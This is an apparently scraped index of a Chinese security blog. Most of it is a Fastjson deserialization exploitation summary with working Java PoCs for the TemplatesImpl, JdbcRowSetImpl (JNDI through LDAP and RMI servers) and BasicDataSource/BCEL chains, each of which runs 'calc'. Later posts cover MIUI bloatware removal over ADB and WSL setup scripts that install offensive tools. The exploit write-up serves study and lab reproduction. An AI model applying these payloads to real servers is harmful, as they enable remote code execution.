Runtime.getRuntime().exec(\"calc\"); } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) { } @Override public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException { } public static void main(String[] args) throws Exception { Test t = new Test(); } } PoC.java package com; import com.alibaba.fastjson.JSON; import com.alibaba.fastjson.parser.Feature; import com.alibaba.fastjson.parser.ParserConfig; import org.apache.commons.codec.binary.Base64; import org.apache.commons.compress.utils.IOUtils; import java.io.ByteArrayOutputStream; import java.io.File; import java.io.FileInputStream; import java.io.IOException; public class PoC { public static String readClass(String cls){ ByteArrayOutputStream bos = new ByteArrayOutputStream(); try { IOUtils.copy(new FileInputStream(new File(cls)), bos); } catch (IOException e) { e.printStackTrace(); } return Base64.encodeBase64String(bos.toByteArray()); } public static void main(String args[]){ try { ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\src\\\\main\\\\java\\\\com\\\\Impl\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"{\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],'_name':'a.b','_tfactory':{ },\\\"_outputProperties\\\":{ },\" + \"\\\"_name\\\":\\\"a\\\",\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\\n\"; System.out.println(text1); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //Object obj = JSON.parse(text1, Feature.SupportNonPublicField); } catch (Exception e) { e.printStackTrace(); } } } PoC中几个重要的Json键的含义： @type——指定的解析类，即com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，_bytecodes和_name都是私有属性，所以想要反序列化这两个属性，需要在parseObject()时设置Feature.SupportNonPublicField； _bytecodes——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串； _outputProperties——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行； _tfactory:{}——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置； ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:2","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"分析 当解析到_outputProperties的内容时，看到前面的下划线被去掉了： 跟进该方法，发现会通过反射机制调用com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() 方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法： 跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法： 跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法： 继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）： 再往下就是新建Test类实例的过程，并调用Test类的构造函数： 再之后就是弹计算器了。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:8:3","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"基于JdbcRowSetImpl的利用链 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"依赖 基于RMI利用的JDK版本\u003c=6u141、7u131、8u121，基于LDAP利用的JDK版本\u003c=6u211、7u201、8u191。 并且实际利用中需要连接远程恶意服务器，在目标没外网的情况下无法直接利用； ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:1","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POC Exploit.java 注：编译exploit.class中不能有包名 import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.io.IOException; import java.io.Serializable; import java.util.Hashtable; public class Exploit implements ObjectFactory, Serializable { /** * 要注册的Exploit */ public Exploit() { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable\u003c?, ?\u003e environment) throws Exception { return null; } public static void main(String[] args) { Exploit exploit = new Exploit(); } } ldap package com.JNDI; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LdapServer { private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8000/#Exploit\"; int port = 1389; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos \u003e 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } RMI package com.JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.NamingException; import javax.naming.Reference; import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException { Registry registry = LocateRegistry.createRegistry(11099); System.out.println","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:2","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"分析 先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址： 接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数： 跟进connect()函数，看到了熟悉的JNDI注入的代码即InitialContext.lookup()，并且其参数是调用this.getDataSourceName() 获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞： 再往下就是JNDI注入的调用过程了，最后是成功利用JNDI注入触发Fastjson反序列化漏洞、达到任意命令执行效果。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:9:3","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"基于BasicDataSource的利用链 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:0","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"依赖 BasicDataSource类在旧版本的 tomcat-dbcp 包中，对应的路径是 org.apache.tomcat.dbcp.dbcp.BasicDataSource。 比如：6.0.53、7.0.81等版本。MVN 依赖写法如下： \u003c!-- https://mvnrepository.com/artifact/org.apache.tomcat/dbcp --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003edbcp\u003c/artifactId\u003e \u003cversion\u003e6.0.53\u003c/version\u003e \u003c/dependency\u003e 在Tomcat 8.0之后包路径有所变化，更改为了 org.apache.tomcat.dbcp.dbcp2.BasicDataSource，所以构造PoC的时候需要注意一下。 MVN依赖写法如下： \u003c!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-dbcp\u003c/artifactId\u003e \u003cversion\u003e9.0.8\u003c/version\u003e \u003c/dependency\u003e 或者直接去https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp下载对应jar包导入项目复现 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:1","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"POC： evil package com; import java.io.IOException; public class Evil { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { e.printStackTrace(); } } } poc package com; import com.alibaba.fastjson.JSON; import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class evilPoc { public static void main(String [] args) throws Exception{ JavaClass cls = Repository.lookupClass(Evil.class); String code = Utility.encode(cls.getBytes(),true); System.out.println(code); // new ClassLoader().loadClass(\"$$BCEL$$\" + code).newInstance(); String poc = \"{\\n\" + \" {\\n\" + \" \\\"x\\\":{\\n\" + \" \\\"@type\\\": \\\"org.apache.tomcat.dbcp.dbcp.BasicDataSource\\\",\\n\" + \" \\\"driverClassLoader\\\": {\\n\" + \" \\\"@type\\\": \\\"com.sun.org.apache.bcel.internal.util.ClassLoader\\\"\\n\" + \" },\\n\" + \" \\\"driverClassName\\\": \\\"$$BCEL$$\"+code+\"\\\"\\n\" + \" }\\n\" + \" }: \\\"x\\\"\\n\" + \"}\"; System.out.println(poc); JSON.parseObject(poc); } } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:2","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"分析 BasicDataSource的toString()方法会遍历这个类的所有getter并执行，于是通过getConnection()-\u003ecreateDataSource()-\u003ecreateConnectionFactory()的调用关系，调用到了createConnectionFactory方法： protected ConnectionFactory createConnectionFactory() throws SQLException { // Load the JDBC driver class Driver driverToUse = this.driver; if (driverToUse == null) { Class\u003c?\u003e driverFromCCL = null; if (driverClassName != null) { try { try { if (driverClassLoader == null) { driverFromCCL = Class.forName(driverClassName); } else { driverFromCCL = Class.forName( driverClassName, true, driverClassLoader); } ... 在createConnectionFactory方法中，调用了Class.forName(driverClassName, true, driverClassLoader) 。有读过我的《Java安全漫谈》第一篇文章的同学应该对Class.forName还有印象，第二个参数initial 为true时，类加载后将会直接执行static{}块中的代码。 因为driverClassLoader和driverClassName 都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可，com.sun.org.apache.bcel.internal.util.ClassLoader，这是一个神奇的ClassLoader，因为它会直接从classname中提取Class的bytecode数据。 如果 classname 中包含$$BCEL$$，这个 ClassLoader 则会将$$BCEL$$ 后面的字符串按照BCEL编码进行解码，作为Class的字节码，并调用 defineClass() 获取 Class 对象。 于是我们通过FastJson反序列化，反序列化生成一个 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 对象，并将它的成员变量 classloader 赋值为 com.sun.org.apache.bcel.internal.util.ClassLoader 对象，将 classname 赋值为 经过BCEL编码的字节码（假设对应的类为Evil.class），我们将需要执行的代码写在 Evil.class 的 static 代码块中即可。 BCEL编码和解码的方法： import com.sun.org.apache.bcel.internal.classfile.Utility; ... String s = Utility.encode(data,true); byte[] bytes = Utility.decode(s, true); ... 0x04 参考 BCEL ClassLoader去哪了？ xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/ Java动态类加载，当FastJson遇到内网 – KINGX Fastjson系列二——1.2.22-1.2.24反序列化漏洞 [ Mi1k7ea ] Fastjson历史补丁Bypass分析 · BlBana’s BlackHouse depycode/fastjson-local-echo: 基于dbcp的fastjson rce 回显 share/ppt/BlackHat USA 2021/us-21-Xing-How-I-Use-A-JSON-Deserialization.pdf (aliyuncs.com) ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:10:3","tags":null,"title":"Fastjson利用总结","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["其他"],"content":"Adb卸载手机原装软件 我的手机系统是miui12.5，其他手机也类似 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:0:0","tags":null,"title":"Adb卸载手机原装软件","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["其他"],"content":"准备 首先下载google adb工具并解压 进入开发者模式。miui中进入设置=》我的****设备=》全部参数。连续点击5下miui版本进入开发者模式。 数据线链接电脑。 回到设置中搜索框输入开发者选项，点进去找到USB调试，接受风险打开。 进入adb目录打开cmd或者powershell 输入.\\adb.exe shell 显示下面这样就成功链接了 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:1:0","tags":null,"title":"Adb卸载手机原装软件","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["其他"],"content":"卸载垃圾应用 命令 ==pm uninstall –user 0 com.miui.systemAdSolution== 最后跟的是应用的包名，包名可以在应用管理中查看，想卸载哪个应用就点开那个应用，把最后的包名替换就行了。success就表示成功了。 下面是我卸载的应用 pm uninstall --user 0 com.miui.systemAdSolution（小米系统广告解决方案） pm uninstall --user 0 com.miui.analytics（小米广告分析） pm uninstall --user 0 com.miui.personalassistant（智能助理：既不智能，也不助理，除了卡，没别哒） pm uninstall --user 0 com.miui.bugreport （bug 反馈：反馈了也不修，反馈个啥） pm uninstall --user 0 com.xiaomi.gamecenter.sdk.service （小米游戏中心服务） pm uninstall --user 0 com.xiaomi.gamecenter （小米游戏中心） pm uninstall --user 0 com.miui.player （小米音乐：垃圾） pm uninstall --user 0 com.miui.video （小米视：垃圾） pm uninstall --user 0 com.android.email （邮件：垃圾） pm uninstall --user 0 com.miui.hybrid （混合器） pm uninstall --user 0 com.android.browser （浏览器：垃圾） pm uninstall --user 0 com.miui.yellowpage （黄页） pm uninstall --user 0 com.xiaomi.midrop （小米快传） pm uninstall --user 0 com.miui.virtualsim （小米虚拟器） pm uninstall --user 0 com.xiaomi.payment （小米支付：垃圾） pm uninstall --user 0 com.mipay.wallet （小米钱包：垃圾） pm uninstall --user 0 com.android.soundrecorder （录音机） pm uninstall --user 0 com.android.wallpaper （壁纸：卸载完背景就成纯黑了，大家别学我） pm uninstall --user 0 com.miui.voiceassist （语音助手） pm uninstall --user 0 com.miui.touchassistant （悬浮球） pm uninstall --user 0 com.android.cellbroadcastreceiver （小米广播） pm uninstall --user 0 com.xiaomi.mitunes （小米助手） pm uninstall --user 0 com.xiaomi.pass （小米卡包） pm uninstall --user 0 com.android.thememanager （个性主题管理） pm uninstall --user 0 com.android.wallpaper （动态壁纸） pm uninstall --user 0 com.android.wallpaper.livepicker （动态壁纸获取） pm uninstall --user 0 com.miui.klo.bugreport （KLO bug 反馈） 网上说下面这四个卸载完就开不了机了，我没敢试。有兴趣的同学不妨试一下 com.miui.cloudservice（小米云服务） com.xiaomi.account（小米账户） com.miui.cloudbackup（云备份） com.xiaomi.market（应用市场） ","date":"2022-02-01","objectID":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/:2:0","tags":null,"title":"Adb卸载手机原装软件","uri":"https://songzhiv.github.io/adb%E5%8D%B8%E8%BD%BD%E6%89%8B%E6%9C%BA%E5%8E%9F%E8%A3%85%E8%BD%AF%E4%BB%B6/"},{"categories":["其他"],"content":"配置 注：本文脚本仅适用于wsl2，不要在Ubuntu直接运行。 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:0:0","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"重回Ubuntu ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:0","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"换源 sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list sudo apt update ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:1","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"代理 https://zhuanlan.zhihu.com/p/108927713 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:1:2","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"软件安装与配置 终端 sudo apt install zsh sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting git clone --depth=1 https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions neovim sudo apt install -y neovim sudo apt autoremove vim sudo apt autoremove nano sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' mkdir ~/.config/nvim/ nvim ~/.config/nvim/init.vim curl -sL install-node.now.sh/lts | bash sudo apt-get install yarn :CocInstall coc-cmake coc-git coc-highlight coc-json coc-python coc-sh coc-snippets coc-syntax software sudo apt upgrade sudo apt install python2.7 sudo apt install python3-pip pip3 install -i https://mirrors.ustc.edu.cn/pypi/web/simple pip -U pip3 config set global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple git挂代理 git config --global http.https://github.com.proxy socks5://127.0.0.1:10808 git config --global http.https://github.com.proxy https://127.0.0.1:10809 git config --global https.https://github.com.proxy https://127.0.0.1:10809 git config --global --unset http.proxy git config --global --unset https.proxy export http_proxy=\"http://localhost:port\" export https_proxy=\"http://localhost:port\" alias setproxy=\"export ALL_PROXY=socks5://127.0.0.1:10808\" alias unsetproxy=\"unset ALL_PROXY\" docker curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs)\\ stable\" sudo apt update sudo apt install -y docker-ce 用管理员打开windows terminal sudo service docker start docker ps sudo vi /etc/docker/.json 添加============================= { \"registry-mirrors\": [\"https://docker.mirrors.ustc.edu.cn/\"] } pip3 install docker-compose sudo git clone --depth=1 https://github.com/maurosoria/dirsearch.git /opt/dirsearch sudo ln -sf /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch sudo git clone --depth=1 https://github.com/offensive-security/exploitdb.git /opt/exploitdb sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit sudo git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb \u003e msfinstall \u0026\u0026 \\ chmod 755 msfinstall \u0026\u0026 \\ ./msfinstall sudo apt install nmap sudo apt install hydra sudo git clone --depth=1 https://github.com/vulhub/vulhub.git ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:0","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"init.vim call plug#begin('~/.config/vim_plug/plugged') Plug 'sainnhe/sonokai' Plug 'vim-python/python-syntax' Plug 'vim-airline/vim-airline' Plug 'vim-airline/vim-airline-themes' Plug 'luochen1990/rainbow' Plug 'preservim/nerdtree' Plug 'neoclide/coc.nvim', {'branch': 'release'} call plug#end() filetype plugin on filetype indent on set ambiwidth=double set showmatch \" 高亮匹配括号 set ignorecase set clipboard+=unnamed set softtabstop=4 set shiftwidth=4 set nobackup set termguicolors set nu \"设置显示行号 syntax on \"语法检测 set guicursor=i:block-iCursor-blinkon0,v:block-vCursor set autoindent set t_Co=256 set mouse=a set tabstop=4 set history=1000 set encoding=utf-8 let g:rainbow_active = 1 map \u003cTab\u003e :NERDTreeToggle\u003cCR\u003e nmap \u003cF12\u003e :SCCompileRun\u003ccr\u003e nnoremap \u003cF9\u003e :echo system('python2 \"' . expand('%') . '\"')\u003ccr\u003e nnoremap \u003cF10\u003e :echo system('python3 \"' . expand('%') . '\"')\u003ccr\u003e ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:1","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":".zshrc # If you come from bash you might have to change your $PATH. # export PATH=$HOME/bin:/usr/local/bin:$PATH # Path to your oh-my-zsh installation. export ZSH=\"/root/.oh-my-zsh\" # Set name of the theme to load --- if set to \"random\", it will # load a random theme each time oh-my-zsh is loaded, in which case, # to know which specific one was loaded, run: echo $RANDOM_THEME # See https://github.com/ohmyzsh/ohmyzsh/wiki/Themes ZSH_THEME=\"robbyrussell\" # Set list of themes to pick from when loading at random # Setting this variable when ZSH_THEME=random will cause zsh to load # a theme from this variable instead of looking in $ZSH/themes/ # If set to an empty array, this variable will have no effect. # ZSH_THEME_RANDOM_CANDIDATES=( \"robbyrussell\" \"agnoster\" ) # Uncomment the following line to use case-sensitive completion. # CASE_SENSITIVE=\"true\" # Uncomment the following line to use hyphen-insensitive completion. # Case-sensitive completion must be off. _ and - will be interchangeable. # HYPHEN_INSENSITIVE=\"true\" # Uncomment the following line to disable bi-weekly auto-update checks. # DISABLE_AUTO_UPDATE=\"true\" # Uncomment the following line to automatically update without prompting. # DISABLE_UPDATE_PROMPT=\"true\" # Uncomment the following line to change how often to auto-update (in days). # export UPDATE_ZSH_DAYS=13 # Uncomment the following line if pasting URLs and other text is messed up. # DISABLE_MAGIC_FUNCTIONS=\"true\" # Uncomment the following line to disable colors in ls. # DISABLE_LS_COLORS=\"true\" # Uncomment the following line to disable auto-setting terminal title. # DISABLE_AUTO_TITLE=\"true\" # Uncomment the following line to enable command auto-correction. # ENABLE_CORRECTION=\"true\" # Uncomment the following line to display red dots whilst waiting for completion. # COMPLETION_WAITING_DOTS=\"true\" # Uncomment the following line if you want to disable marking untracked files # under VCS as dirty. This makes repository status check for large repositories # much, much faster. # DISABLE_UNTRACKED_FILES_DIRTY=\"true\" # Uncomment the following line if you want to change the command execution time # stamp shown in the history command output. # You can set one of the optional three formats: # \"mm/dd/yyyy\"|\"dd.mm.yyyy\"|\"yyyy-mm-dd\" # or set a custom format using the strftime function format specifications, # see 'man strftime' for details. # HIST_STAMPS=\"mm/dd/yyyy\" # Would you like to use another custom folder than $ZSH/custom? # ZSH_CUSTOM=/path/to/new-custom-folder # Which plugins would you like to load? # Standard plugins can be found in $ZSH/plugins/ # Custom plugins may be added to $ZSH_CUSTOM/plugins/ # Example format: plugins=(rails git textmate ruby lighthouse) # Add wisely, as too many plugins slow down shell startup. plugins=( git zsh-syntax-highlighting zsh-completions zsh-autosuggestions z ) source $ZSH/oh-my-zsh.sh # User configuration # export MANPATH=\"/usr/local/man:$MANPATH\" # You may need to manually set your language environment # export LANG=en_US.UTF-8 # Preferred editor for local and remote sessions # if [[ -n $SSH_CONNECTION ]]; then # export EDITOR='vim' # else # export EDITOR='mvim' # fi # Compilation flags # export ARCHFLAGS=\"-arch x86_64\" # Set personal aliases, overriding those provided by oh-my-zsh libs, # plugins, and themes. Aliases can be placed here, though oh-my-zsh # users are encouraged to define aliases within the ZSH_CUSTOM folder. # For a full list of active aliases, run `alias`. # # Example aliases # alias zshconfig=\"mate ~/.zshrc\" # alias ohmyzsh=\"mate ~/.oh-my-zsh\" alias py=\"python\" alias py3=\"python3\" alias sqlmap=\"python /home/subv/sqlmap-dev/sqlmap.py\" alias docker=\"sudo docker\" alias dc=\"docker-compose\" alias setproxy=\"export ALL_PROXY=socks5://127.0.0.1:10808\" alias unsetproxy=\"unset ALL_PROXY\" ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:2","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"install.sh vim打开 :set ff=unix #!/bin/bash # cd ~/ sudo sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list sudo apt update -y sudo apt install zsh python2.7 python3-pip neovim nmap hydra -y sudo apt autoremove vim nano -y pip3 install -i https://mirrors.ustc.edu.cn/pypi/web/simple pip -U pip3 config set global.index-url https://mirrors.ustc.edu.cn/pypi/web/simple sudo apt install python-dev -y curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - sudo add-apt-repository \\ \"deb [arch=amd64] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu \\ $(lsb_release -cs)\\ stable\" sudo apt update -y sudo apt install -y docker-ce pip3 install docker-compose sh -c 'curl -fLo \"${XDG_DATA_HOME:-$HOME/.local/share}\"/nvim/site/autoload/plug.vim --create-dirs \\ https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim' sudo mkdir ~/.config sudo mkdir ~/.config/nvim/ sudo mkdir /etc/docker/ sudo mv ~/config/daemon.json /etc/docker/ sudo mv ~/config/init.vim ~/.config/nvim/ sudo apt install nodejs -y sudo apt-get install yarn -y sudo apt upgrade -y vim +PlugInstall +qall sudo rm -rf ~/.oh-my-zsh/ sudo rm -rf ~/.zshrc sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" echo \"Do you want to set the git proxy(y/N)?\" read input if [[ $input = \"y\" ]] || [[ $input = \"Y\" ]]; then host_ip=$(cat /etc/resolv.conf |grep \"nameserver\" |cut -f 2 -d \" \") git config --global http.https://github.com.proxy socks5://$host_ip:10808 git config --global https.https://github.com.proxy socks5://$host_ip:10808 else echo \"you can use this command by youself: git config --global https.https://github.com.proxy https://host_ip:port\" fi sudo git clone --depth=1 https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions sudo git clone --depth=1 https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting sudo git clone --depth=1 https://github.com/zsh-users/zsh-completions ${ZSH_CUSTOM:=~/.oh-my-zsh/custom}/plugins/zsh-completions cat ~/config/zshrc \u003e\u003e .zshrc sudo git clone --depth=1 https://github.com/maurosoria/dirsearch.git /opt/dirsearch sudo ln -sf /opt/dirsearch/dirsearch.py /usr/local/bin/dirsearch sudo git clone --depth=1 https://github.com/offensive-security/exploitdb.git /opt/exploitdb sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit sudo git clone --depth=1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev sudo git clone --depth=1 https://github.com/vulhub/vulhub.git echo \"input :CocInstall coc-cmake coc-git coc-highlight coc-json coc-python coc-sh coc-snippets coc-syntax in the vim command\" echo \"=========================================\" echo \"=============Good, Enjoy it.=============\" echo \"=========================================\" ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:3","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"WindowsTeminal // This file was initially generated by Windows Terminal Preview 1.5.3242.0 // It should still be usable in newer versions, but newer versions might have additional // settings, help text, or changes that you will not see unless you clear this file // and let us generate a new one for you. // To view the default settings, hold \"alt\" while clicking on the \"Settings\" button. // For documentation on these settings, see: https://aka.ms/terminal-documentation { \"$schema\": \"https://aka.ms/terminal-profiles-schema\", \"defaultProfile\": \"{2c4de342-38b7-51cf-b940-2309a097f518}\", \"initialCols\": 81, //终端窗口初始宽度 \"initialRows\": 26, //终端窗口初始高度 // You can add more global application settings here. // To learn more about global settings, 